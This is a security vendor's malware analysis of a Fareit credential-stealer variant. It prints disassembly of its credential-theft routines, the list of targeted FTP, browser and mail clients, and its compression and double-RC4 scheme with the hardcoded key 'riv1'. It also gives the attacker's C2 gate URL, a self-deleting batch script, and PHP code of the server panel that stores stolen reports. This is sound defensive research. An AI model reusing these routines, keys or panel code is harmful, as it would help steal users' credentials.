@@ -1,0 +1,178 @@
+Fareit is a family of malware designed to steal confidential information.
+It has been around for several years, and typically steals system information and application credentials stored on infected systems.
+Recently, our FortiGuard Lab captured a new Fareit variant which can be detected as virus Malicious_Behavior.VEX.99.
+The MD5 of this malware sample is f69a1384fc510aad8770f073bafe512f.
+In this blog, we want to share our findings about how this Fareit malware variant works.
+The malware sample is a PE file.
+By reversing it, we can find the code which uses a loop to call all functions in a function list.
+These functions are used to collect confidential information from infected systems, including FTP software, web browsers, and email software installed on these systems.
+Following is the code snippet.
+Comments are added and highlighted in yellow.
+loc_40F78C: ; CODE XREF: .text:0040F847j .text:0040F78C call sub_402387 .text:0040F791 push dword ptr [ebp+8] .text:0040F794 call sub_40149F .text:0040F799 mov ds:dword_4172DF, eax .text:0040F79E push large dword ptr fs:0 .text:0040F7A5 mov eax, esp .text:0040F7A7 push large dword ptr fs:0 .text:0040F7AE push ebp .text:0040F7AF push eax .text:0040F7B0 push offset loc_40F83A .text:0040F7B5 push offset sub_40F7F3 .text:0040F7BA push eax .text:0040F7BB mov large fs:0, esp .text:0040F7C2 push dword ptr [ebp+8] .text:0040F7C5 call dword ptr [edi] ; call an information stealing function, edi points to the function in the function list .text:0040F7C7 cmp dword ptr [edi], offset sub_4043C2 ; .text:0040F7CD jz short loc_40F7EE .text:0040F7CF cmp eax, 10h .text:0040F7D2 jz short loc_40F7DD .text:0040F7D4 mov dword ptr [ebp-4], 1 .text:0040F7DB jmp short loc_40F7EE [.....]
+.text:0040F841 add edi, 4 ; let edi point to next function in the function list.
+.text:0040F844 loc_40F844: ; CODE XREF: .text:loc_40F787j .text:0040F844 cmp dword ptr [edi], 0 .text:0040F847 jnz loc_40F78C ; continue to call next function.
+.text:0040F84D mov eax, [ebp-4] […..]
+As you can see from the above code snippet, in the instruction “call dword ptr [edi]”, edi refers to a function in a function list.
+All functions in the function list are called one by one to obtain confidential information from the Windows registry and the local files of the infected system.
+There are about 97 such functions in the function list.
+Here we just picked one of them as an example to analyze, which is used to obtain the “HostName,” ”User,” and “Password” of the “Far FTP” software installed on the infected system.
+Following is the code snippet of the function.
+Comments are added and highlighted in yellow color.
+sub_40485A proc near ; DATA XREF: 0041715B o 0040485A push ebp 0040485B mov ebp, esp 0040485D add esp, 0FFFFFFFCh 00404860 push 0 00404862 push 1 00404864 push [ebp+arg_0] 00404867 call sub_40156D 0040486C mov [ebp+var_4], eax 0040486F push offset aSoftwareFarPlu ; "Software\\Far\\Plugins\\FTP\\Hosts" 00404874 push [ebp+arg_0] 00404877 call sub_4046E0 ; See below for more information 0040487C push offset aSoftwareFar2Pl ; "Software\\Far2\\Plugins\\FTP\\Hosts" 00404881 push [ebp+arg_0] 00404884 call sub_4046E0 ; See below for more information 00404889 push offset aSoftwareFarMan ; "Software\\Far Manager\\Plugins\\FTP\\Ho"... 0040488E push [ebp+arg_0] 00404891 call sub_4046E0 ; See below for more information 00404896 push offset aSoftwareFarSav ; "Software\\Far\\SavedDialogHistory\\FTPH"... 0040489B push [ebp+arg_0] 0040489E call sub_4045D2 004048A3 push offset aSoftwareFar2Sa ; "Software\\Far2\\SavedDialogHistory\\FTP"... 004048A8 push [ebp+arg_0] 004048AB call sub_4045D2 004048B0 push offset aSoftwareFarM_0 ; "Software\\Far Manager\\SavedDialogHisto"... 004048B5 push [ebp+arg_0] 004048B8 call sub_4045D2 004048BD push [ebp+var_4] 004048C0 push [ebp+arg_0] 004048C3 call sub_4015B3 004048C8 leave 004048C9 retn 4 sub_4046E0 proc near [……] 0040470A mov [ebp+cchName], 7FFh 00404711 push 0 ; lpftLastWriteTime 00404713 push 0 ; lpcchClass 00404715 push 0 ; lpClass 00404717 push 0 ; lpReserved 00404719 lea eax, [ebp+cchName] 0040471C push eax ; lpcchName 0040471D lea eax, [ebp+Name] 00404723 push eax ; lpName 00404724 push [ebp+dwIndex] ; dwIndex 00404727 push [ebp+phkResult] ; hKey 0040472A call RegEnumKeyExA 0040472F or eax, eax 00404731 jz short loc_404738 00404733 jmp loc_40484E 00404738 loc_404738: ; CODE XREF: sub_4046E0+51j 00404738 push offset asc_414823 ; "\\" 0040473D push [ebp+lpSubKey] 00404740 call sub_401D75 ; strcat(arg0,arg4) 00404745 push eax 00404746 mov edx, eax 00404748 lea eax, [ebp+Name] 0040474E push eax 0040474F push edx 00404750 call sub_401D75 ; strcat(arg0,arg4) 00404755 mov [ebp+var_810], eax 0040475B call sub_401835 ; LocalFree 00404760 push 0 00404762 push offset aPassword ; "Password" 00404767 push [ebp+var_810] 0040476D push ds:hKey 00404773 call sub_401CEE ; call RegQueryValueEx 00404778 mov [ebp+var_81C], eax ; password 0040477E push 0 00404780 push offset aHostname ; "HostName" 00404785 push [ebp+var_810] 0040478B push ds:hKey 00404791 call sub_401CEE ; call RegQueryValueEx 00404796 mov [ebp+var_814], eax ; hostname 0040479C push 0 0040479E push offset aUser ; "User" 004047A3 push [ebp+var_810] 004047A9 push ds:hKey 004047AF call sub_401CEE ; call RegQueryValueEx 004047B4 mov [ebp+var_818], eax ; user […..]
+In the above code snippet, "Software\\Far\\Plugins\\FTP\\Hosts" is Far FTP’s key in the Windows registry.
+The malware sample enumerates all the subkeys under it, and tries to obtain the registry values whose names are “HostName”, “User” or “Password”.
+Following is the list of software whose names appear in this malware sample.
+This malware might steal their confidential information by using functions in the function list if they are installed on the infected system.
+GhislerFTP, WS_FTP, CUTEFTP, FlashFXP, FileZilla, FTPNavigator, BPFTP, SmartFTP, TurboFTP, FFFTP, CoffeeCupFreeFTP, COREFTP, FTPExplorer, Frigate3, SecureFX, UltraFXP, FTPRush, WebSitePublisher, BitKinex, ExpanDrive, ClassicFTP, Fling, FTPClient, Directory Opus, CoffeeCup, leapftp, Martin Prikryl, NetDrive, WebDrive, FTP CONTROL, Opera, AceBIT, FTPVoyager, Firefox, SeaMonkey, Flock, LeechFTP, WinFTP, FTPGetter, ALFTP, Adobe, DeluxeFTP, Chrome, ChromePlus, Bromium, Nichrome, Comodo, RockMelt, K-Meleon browser, Epic, Staff-FTP, Global Downloader, FreshFTP, BlazeFtp, FTP++, GoFTP, 3D-FTP, EasyFTP, NetSarang, FTPNow, Robo-FTP, LinasFTP, Cyberduck, PuTTY, NppFTP, CoffeeCup, FTPShell, FTPInfo, NexusFile, FastStone Browser, ChromePlus, WinZip\FTP, Yandex, My FTP, "{74FF1730-B1F2-4D88-926B-1568FAE61DB7}", NovaFTP, Windows Live Mail, Windows Mail, B2 mail, Pocomail, IncrediMail, BatMail, Outlook, Mozilla, FastTrack, etc.
+As you can see, it includes some well-known FTP software, web browsers, Email software, etc.
+When we were doing the dynamic analysis of this malware sample, we got the original collected confidential information in the memory.
+It is saved in a special format as follows:
+50 57 44 46 49 4C 45 30 31 2E 30 00 00 00 00 00 PWDFILE01.0 02 00 4D 4F 44 55 01 01 3C 01 00 00 00 00 00 00 MODU < 01 00 EF BE 9C 00 00 00 9C 00 00 00 05 00 00 00 ?
+?
+01 00 00 00 28 0A 00 00 02 00 00 00 53 65 72 76 ( Serv 69 63 65 20 50 61 63 6B 20 33 00 00 00 00 00 00 ice Pack 3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 03 00 00 00 00 01 01 00 00 00 00 00 1B 00 00 00 50 65 6F 70 Peop 6C 65 27 73 20 52 65 70 75 62 6C 69 63 20 6F 66 le's Republic of 20 43 68 69 6E 61 00 08 00 00 00 43 68 69 6E 65 China Chine 73 65 00 01 00 00 00 29 00 00 00 FF FF FF FF 11 se ) ????
+11 11 11 11 11 11 11 11 11 11 7B 37 32 38 37 35 {72875 42 41 30 2D 42 41 36 34 2D 34 46 37 41 2D 38 35 BA0-BA64-4F7A-85 42 31 34 7D 24 00 00 00 00 00 00 00 00 10 00 00 B14}$ 00 00 01 00 FF FF FE 7F 01 00 00 00 01 00 00 00 ?
+?t 4A 02 00 00 00 00 01 00 06 00 09 3A 02 00 4D 4F J : MO 44 55 01 01 23 00 00 00 01 00 00 00 01 00 EF BE DU # ??
+00 00 00 00 07 00 00 00 31 31 31 31 31 31 00 02 111111 00 4D 4F 44 55 01 01 32 00 00 00 02 00 00 00 00 MODU 2 00 EF BE 1A 00 00 00 74 68 65 20 63 6F 6E 74 65 ??
+the conte 6E 74 20 6F 66 20 77 63 78 5F 66 74 70 2E 69 6E nt of wcx_ftp.in 69 02 00 4D 4F 44 55 01 01 26 00 00 00 04 00 00 i MODU & 00 01 00 EF BE 0E 00 00 00 71 63 68 69 73 74 6F ??
+qchisto 72 79 5F 66 74 70 00 ry_ftp
+50 57 44 46 49 4C 45 30 31 2E 30 (“PWDFILE01.0”) is the data banner of original collected information.
+02 00 4D 4F 44 55 01 01 is the start flag of a data block which saves the obtained confidential information of one software.
+The DWORD value after the start flag is the size in bytes of this data block.
+The first data block saves the information about the infected system.
+In this case, you can see it contains system patch, country, language, HWID, etc.
+The other blocks save the collected information about FTP software, web browsers, Email software, etc.
+Before the collected confidential information is sent to the attacker-controlled server, the entire data will be compressed by calling aPLib’s aplib.dll!aP_pack function.
+Then the malware passes the compressed data to RC4 encryption function twice with a different RC4 key each time.
+The compressed data might look like: 50 4B 44 46 49 4C 45 30 C7 01 00 00 E8 00 00 00 PKDFILE0?
+è 50 00 57 44 46 49 4C 45 30 31 73 2E E1 43 01 02 P WDFILE01s.áC 80 4D 4F 44 38 55 01 B9 3C F0 86 C3 0E EF BE 9C €MOD8U 1<e??
+???
+1 40 11 04 05 AB 10 14 02 28 0A 28 60 02 53 65 72 @ ?
+( (` Ser 76 3A 69 63 8E 20 50 61 AE 6B AE 33 11 EA CA 03 v:ic?
+Pa?k?3 êê A1 68 A9 C6 1B 09 07 50 65 6F 70 6C 40 27 73 20 ?h??
+Peopl@'s 52 F3 E0 75 62 F5 47 9B 93 6F 66 E1 43 68 E0 6E Róàub?G?“ofáChàn 61 E0 08 8A 03 0A 65 73 95 33 C3 29 32 09 FF 03 aà ?
+es?3?
+)2 ?
+11 1C 0E 7B 37 32 38 60 35 42 41 30 2D C7 08 36 {728`5BA0-?
+6 34 5E 4F 46 BE FD 33 38 20 31 D9 7D 24 58 71 10 4^OF?y38 1ù}$Xq 86 C7 73 FE 7F 69 38 0C 4A 02 A4 14 70 06 24 09 ?
+?st i8 J ¤ p $ 3A 3C 51 23 4D 1C 49 3C 03 1E 07 2A 09 31 01 A5 :<Q#M |< * 1￥ 5F 9C 32 24 43 CE 19 47 1A 11 74 68 20 47 63 3B _?2$C?
+G th Gc; 6F 6E F6 D0 06 B5 8F 77 87 78 5F 6F A5 70 2E 1C on?D μ w?x_o￥p.
+B1 AB 32 11 26 29 04 55 91 0E 14 71 63 CF 02 73 ±?2 &) U‘ qc?
+s 74 6F 72 79 8E 29 18 00
+50 4B 44 46 49 4C 45 30 (” PKDFILE0”) is the banner of the compressed data.
+“C7 01 00 00” and “E8 00 00 00” are the original size and compressed size of the data.
+The compressed data then will be RC4 encrypted twice.
+After the first RC4 encryption, the data might look like:
+43 52 59 50 54 45 44 30 51 4D F7 55 43 F0 B0 0A CRYPTED0QM÷UCe° 43 E1 AD F2 4F 7B 7C CB 93 BC 08 78 81 62 55 64 Cá-òO{|?“?
+x bUd 3B 66 89 1A 99 38 FA 69 0F C0 1B F1 DB 50 1F D2 ;f‰ ?8úi à ?
+?P ò 5F 02 AF 50 D7 0E 57 34 46 2F E3 72 30 CA F3 C0 _ ˉP× W4F/?r0êóà BB 99 16 68 9B 97 56 CE 3C 1C B5 7A B4 69 06 A3 ??
+h?—V?< μz′i ￡ EA C2 0D 27 58 94 EA 6C 4B 4F 1A 57 B8 0D 14 AB ê?
+'X”êlKO W?
+?
+D2 67 B8 81 02 25 34 E7 9B BC 36 54 5A 9E 28 3A òg?
+%4???6TZ?
+(: 04 A7 AD D3 D4 A8 AC 62 7C D8 6B 87 28 70 08 38 §-ó?¨?b|?k?
+(p 8 22 9E 4F 35 7E AF CB E6 EE 86 76 15 87 D5 C0 53 "?O5~ˉ???
+?v ?
+?àS 1D 76 58 F1 D2 0E 64 26 94 7F 9F 47 4E 02 E6 26 vX?ò d&” ?GN ?& CA E8 0F 6D AD BA 1E 0B 14 5C 64 98 F2 CD 7E 82 êè m-o \d?òí~?
+9D A0 DD F1 D8 DE C3 55 16 4C 23 CF 2D 0F F0 2C ?Y?
+?T?U L#?- e, DF 13 D9 22 F4 80 F3 10 81 7E 96 89 0D 4B 83 F3 ?
+ù"?€ó ~–‰ K?ó 8C 6F 40 BA 89 32 0B 23 80 70 2F 5F 0C E8 0A F2 ?o@o‰2 #€p/_ è ò 44 36 71 F2 74 C6 E1 AC E4 81 DA 5D E5 02 F0 F2 D6qòt?á??
+ú]?
+eò 36 26 8F D9 1F 1D 66 C5 73 8B 1C 90 A9 C1 31 AB 6& ù f?s?
+?á1?
+EE 8B B3 C4 A4 1C 41 F8 ?
+?3?¤ A?
+As you can see, it has a new banner “CRYPTED0”.
+In this malware version, the first RC4 key is generated by the hardcoded string “riv1”.
+Please note that the real encrypted data starts from offset +08h, and there are 10h-byte CRC value of compressed data appended at the end.
+After the second RC4 encryption, the data might look like below.
+Note that the first DWORD value is used to generate an RC4 key for decrypting the second RC4 encrypted data, the real encrypted data starts from offset +04h, and there are 4-byte CRC value of first RC4 encrypted data appended at the end.
+This is the final data that is going to be sent to the attacker-controlled server.
+8F FF 8F 6D 7A 31 E4 EA 80 49 C3 AE 39 EB EB BF ?
+mz1?ê€I??9???
+CB 39 46 04 27 D5 0B B4 65 F0 8B 2D 33 4A 09 24 ?9F '?
+′ee?-3J $ B0 FC 99 91 DD 70 C1 3E 80 B1 43 B9 16 9C 17 3C °ü?‘Ypá>€±C1 ?
+< 1F 9C 1A 7E 45 11 E8 6E 17 9A EC B7 9B 23 63 2A ?
+~E èn ?ì·?#c* D1 A0 CC A5 87 E7 00 6D A5 4D E6 60 2B 1E 99 07 ??ì￥??
+m￥M?`+ ?
+4F 9A FB 15 FE CD C8 D4 67 A1 C0 35 9E 7B 1B FB O??
+tíè?g?à5?
+{ ?
+94 3F E5 7E B0 A8 6E CA C8 87 FC 1A CD C8 AD 23 ”?
+?~°¨nêè?ü íè-# 0E DF 6E 51 DD 6A 80 5A F9 CB A6 E4 75 38 12 C5 ?nQYj€Zù?|?u8 ?
+8F 93 25 99 7E 95 12 16 16 11 DF C4 3B B7 28 75 “%?~?
+??
+;·(u F4 7A D8 0D A7 B6 D6 B9 CB 94 93 0A 9C 53 E6 FD ?z?
+§?
+?1?”“ ?S?y 8F CC 8C 01 E4 8A 22 0E 35 C6 AB E8 26 9D 65 40 ì?
+??"
+5?
+?è& e@ 09 FE 6C D0 3F 57 16 44 15 6B C2 E7 70 DE 09 07 tlD?W D k?
+?pT 2A A7 33 59 59 C2 22 00 51 C1 4F A5 75 93 4D 80 *§3YY?"
+QáO￥u“M€ C9 C1 2E 0D 1C BC C4 FF 45 3D 49 C5 15 CA 1F C2 éá.
+???E=I?
+ê ?
+F0 A7 99 71 73 AB E4 5F 8E 15 48 D4 3A E6 37 AD e§?qs??_?
+H?
+:?7- 4D F3 77 7B BB 8F A0 6A B1 81 12 FF 1C 02 A1 39 Mów{?
+?j± ?
+?9 63 BD 55 EA 38 36 2E 0D 4C D0 CB 59 c?Uê86.
+LD?Y
+The following code snippet shows how the malware obtains confidential information, compresses it, and finally, encrypts it twice.
+Comments are added and highlighted in yellow.
+0040FA25 sub ebx, ebx 0040FA27 push dword ptr [ebp+8] 0040FA2A call loc_40F96F ; obtain the data of all confidential information 0040FA2F or eax, eax [……] 0040FA4B push dword ptr [ebp+8] 0040FA4E call loc_40F9B2 ; calculate crc of confidential information 0040FA53 push dword ptr [ebp+8] 0040FA56 call sub_401752 ; compress confidential information, with aplib.dll!aP_pack 0040FA5B or eax, eax 0040FA5D jnz short loc_40FA61 0040FA5F jmp short ret [......] 0040FA7D loc_40FA7D: ; CODE XREF: 0040FA79j 0040FA7D push offset aTkx3 ; “riv1” is used to generate RC4 key 0040FA82 push dword ptr [ebp+8] 0040FA85 call sub_4019A4 ; the first RC4 encryption 0040FA8A or eax, eax 0040FA8C jnz short loc_40FA90 0040FA8E jmp short ret 0040FA90 loc_40FA90: ; CODE XREF: 0040FA8Cj 0040FA90 push dword ptr [ebp+8] 0040FA93 call sub_4015F2 ; calculate crc of the first RC4 encrypted data 0040FA98 or eax, eax 0040FA9A jnz short loc_40FA9E 0040FA9C jmp short ret 0040FA9E loc_40FA9E: ; CODE XREF: 0040FA9Aj 0040FA9E push dword ptr [ebp+8] 0040FAA1 call sub_401658 0040FAA6 or eax, eax 0040FAA8 jnz short loc_40FAAC 0040FAAA jmp short ret 0040FAAC loc_40FAAC: ; CODE XREF: 0040FAA8j 0040FAAC push dword ptr [ebp+8] 0040FAAF call sub_401A69 ; the second RC4 encryption, a random number is used to generate RC4 key 0040FAB4 or eax, eax 0040FAB6 jnz short loc_40FABA 0040FAB8 jmp short ret [......]
+Inside this malware sample, we can see there are 2 URLs in the URL list which ends with a “|00|”.
+One is http://apple.com/gate.php and the other is http://riv1.fav.al/ddob/gate.php, as follows.
+[…..] .text:0041475B aHttpApple_comG db 'http://apple.com/gate.php',0 .text:00414775 aHttpRiv1_fav_a db 'http://riv1.fav.al/ddob/gate.php',0 .text:00414796 db 0 [……]
+After inspecting them, we think the apple link is faked and it’s just used to confuse analysts, because whatever we send to it, we always get the following response:
+HTTP/1.1 301 MOVED PERMANENTLY Server: Date: Referer: Location: http://www.apple.com/gate.php Content-type: text/html Connection: close
+The following Wireshark screenshot shows the request and response packets with the apple link.
+Figure 1.
+Request And Response Packets With The Apple Link
+Here is the logic of how these URLs are used by the malware.
+The malware picks one of them and tries to send encrypted data to it.
+If the malware doesn’t get the right response with the string “STATUS-IMPORT-OK”, it calls a Sleep function to sleep for 5 seconds.
+It then tries to send the same request again.
+If it still doesn’t get the right response, it picks the next URL in the URL list and sends the same request to it.
+Then it follows the same steps as the previous URL until it gets the right response with the string "STATUS-IMPORT-OK" or gets to the end of the URL list, i.e.
+“|00|”.
+The following Wireshark screenshot shows the interaction between the malware and the attacker controlled server.
+Figure 2.
+Request And Response Packets With Attacker’s Server
+From the above screenshot, we can see the encrypted data is sent as the body of a POST request to “http://riv1.fav.al/ddob/gate.php”, and gets a “STATUS-IMPORT-OK” response from the attacker-controlled server.
+That means the server has successfully handled the stolen information.
+When the malware gets such a response it will exit the process.
+Before exiting the process, it makes a bat file which is able to delete this malware sample file and the bat file itself.
+The content of the bat file looks like this:
+:ktk del %1 if exist %1 goto ktk del %0
+%1 is the first argument passed to the bat file.
+It should be the full name with path of this malware sample.
+%0 is the bat file itself.
+As part of our investigation, we can also confirm that the website http://riv1.fav.al/ is owned by the attacker.
+The website has been designated as a “Malicious Websites” in our web filtering database, and the domain riv1.fav.al has been added to our botnet domain database.
+From the above analysis, we can see the stolen data is sent to the file “gate.php” on the attacker controlled server.
+Luckily, we got the source code of “gate.php.” Following is a code snippet.
+Comments are added and highlighted in yellow.
+Let’s see how it handles the received encrypted data:
+[……] // get the submitted data $real_length = intval($_SERVER['CONTENT_LENGTH']); $received_report_data = file_get_contents('php://input'); // check if data is completely received if ($real_length !== strlen($received_report_data) || $real_length <=4) die(); // first RC4 decryption $received_report_data = rc4Decrypt(substr($received_report_data, 0, 4), substr($received_report_data, 4)); $report_id = 0; // report data length should be in between 12 bytes and 900 Kb (default mysql query max.
+length) $max_db_len_size = 1024*900; if (strlen($received_report_data) > 12 && strlen($received_report_data) <= $max_db_len_size){ if (report_parser::verify_report_file_header($received_report_data)) { $report_status_ok = false; $ip_country = geo_ip_country_code($ip); if (report_parser::check_report_crypted_header($received_report_data)) { // second RC4 decryption report_parser::pre_decrypt_report($received_report_data, $pony_db_report_password); } // add non-parsed report $report_id = $pony_db->add_nonparsed_report($ip, $ip_country, $received_report_data); if ($report_id) { // there's new report available for parsing $report = new report_parser($pony_report_options); ob_start(); // detect report processing noise error_reporting(E_ALL); // we guess this function is used to decompress data $parse_result = $report->process_report($received_report_data, $pony_db_report_password); $ob_data = trim(ob_get_contents()); error_reporting(0); ob_end_clean(); if ($parse_result) { $report_status_ok = true; if ($enable_http_mode) $url_list_array = array_merge($report->ftp_lines, $report->http_lines); else $url_list_array = $report->ftp_lines; $url_list_array = array_merge($url_list_array, $report->rdp_lines); if ($enable_email_mode) { $email_lines = $report->email_lines; } else { $email_lines = null; } // save stolen confidential information into database.
+$pony_db->update_parsed_report($report_id, $report->report_os_name, $report- >report_is_win64, $report->report_is_admin, $report->report_hwid, $report->report_version_id, $url_list_array, $report->log- >log_lines, $report->cert_lines, $email_lines); $pony_db->add_log_line('ERR_EXTRA_NOISE: '.$ob_data, CLOG_SOURCE_REPORT, $report_id, $log_extra); } } else { // parse error, write logs $log = $report->log->log_lines; $pony_db->import_log_list($log, CLOG_SOURCE_REPORT, $report_id); } } else if ($pony_db->state) { $report_status_ok = true; $pony_db->add_log_line('NOTIFY_GATE_DUPLICATE_REPORT', CLOG_SOURCE_GATE, null, $ip); } // check data parsing state and return success status to the client if ($report_status_ok) { echo 'STATUS-IMPORT-OK'; } [……]
+Based on the process on the infected system, we can expect that the server should decrypt the submitted data twice with the RC4 decryption function, then decompress the decrypted data, update the stolen information to a database, and return a response with a success status to the client.
+Let’s see what the server really does:
+At first the server verifies if the received data is complete.
+Then it decrypts the received data twice.
+Here is the first decryption code $received_report_data = rc4Decrypt(substr($received_report_data, 0, 4), substr($received_report_data, 4));.
+The first argument is the first 4 bytes of received data which is used to generate an RC4 key for the first decryption.
+The second argument is the data to be decrypted.
+The code report_parser::pre_decrypt_report($received_report_data, $pony_db_report_password); is the second decryption.
+$received_report_data is the encrypted data, and $pony_db_report_password is a string (it should be “riv1” for this malware version) in its database that is used to generate an RC4 key for the second decryption.
+After that, the data is restored to the compressed data.
+The code $parse_result = $report->process_report($received_report_data, $pony_db_report_password); we guess is used to do the decompression.
+The following code is used to write the stolen confidential information into a database that $pony_db connects to.
+$pony_db->update_parsed_report($report_id, $report->report_os_name, $report->report_is_win64, $report->report_is_admin, $report->report_hwid, $report->report_version_id, $url_list_array, $report->log->log_lines, $report->cert_lines, $email_lines);
+The code echo 'STATUS-IMPORT-OK'; returns a success status to the client.
+As you can see, the process is just what we expected.
+Fareit is a well-known information stealer.
+Based on the above analysis, we can see what confidential information is stolen from infected systems and how it does that.
+In order to bypass network security detection, the stolen data is heavily encrypted before it’s sent to the attacker-controlled server.
+As we continue to track and investigate the Fareit family, we will update you with more information as it comes to light.
